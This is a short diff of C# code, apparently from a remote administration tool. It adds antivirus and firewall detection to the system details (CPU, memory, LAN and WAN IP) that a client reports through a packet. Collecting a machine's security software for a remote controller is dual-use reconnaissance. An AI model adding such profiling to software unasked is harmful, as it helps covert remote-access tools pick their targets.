@@ -320,7 +320,7 @@ namespace Core.Commands
 		{
 			try
 			{
-				string[] infoCollection = new string[16];
+				string[] infoCollection = new string[20];
 				infoCollection[0] = "Processor (CPU)";
 				infoCollection[1] = SystemCore.GetCpu();
 				infoCollection[2] = "Memory (RAM)";
@@ -337,6 +337,10 @@ namespace Core.Commands
 				infoCollection[13] = SystemCore.GetLanIp();
 				infoCollection[14] = "WAN IP Address";
 				infoCollection[15] = SystemCore.WANIP;
+				infoCollection[16] = "Antivirus";
+				infoCollection[17] = SystemCore.GetAntivirus();
+				infoCollection[18] = "Firewall";
+				infoCollection[19] = SystemCore.GetFirewall();
 				new Core.Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
 			}
 			catch
